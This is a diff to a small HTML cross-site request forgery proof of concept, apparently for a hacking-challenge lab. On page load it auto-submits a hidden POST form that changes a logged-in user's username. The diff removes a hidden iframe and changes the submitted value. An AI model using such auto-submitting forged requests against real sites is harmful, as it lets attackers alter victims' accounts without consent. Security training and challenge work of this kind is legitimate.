@@ -2,10 +2,7 @@
 <meta charset="utf-8" />
 <title>CSRF PoC – change username</title>
 <body onload="document.forms[0].submit()">
-  <!-- Thay domain nếu instance của bạn khác -->
-  <form action="https://hackingchallenge.spsglobal.com/profile"
-        method="POST" target="hidden">
-    <input type="hidden" name="username" value="hacking">
+  <form action="https://hackingchallenge.spsglobal.com/profile" method="POST">
+    <input type="hidden" name="username" value="hchai1506">
   </form>
-  <iframe name="hidden" style="display:none"></iframe>
 </body>
